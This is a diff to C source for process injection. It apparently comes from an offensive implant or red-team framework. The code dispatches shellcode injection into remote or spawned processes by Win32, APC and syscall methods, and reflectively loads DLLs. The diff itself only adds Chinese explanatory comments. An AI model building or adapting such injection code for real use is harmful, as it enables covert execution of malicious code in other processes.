@@ -13,10 +13,12 @@ BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes
 {
     NTSTATUS NtStatus = 0;
 
+    // Inject为True是注入，False是Spawn
+    // 两种方式最后调用的是一样的方案，不同的是Spawn会先创建进程，然后将进程ID传入
     if ( Inject )
     {
         PUTS( "Inject into a remote process" )
-
+        // APC和Syscall
         switch ( Method )
         {
             case INJECTION_TECHNIQUE_WIN32: PUTS( "INJECTION_TECHNIQUE_WIN32" )
@@ -103,7 +105,7 @@ BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes
     else
     {
         PUTS( "Spawn and inject" )
-
+        //APC和Syscall
         switch ( Method )
         {
             case INJECTION_TECHNIQUE_APC:
@@ -321,6 +323,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLen
         return FALSE;
     }
 
+    // 校验版本
     if ( ProcessIsWow( hTargetProcess ) ) // check if remote process x86
     {
         if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X86 ) // check if dll is x64
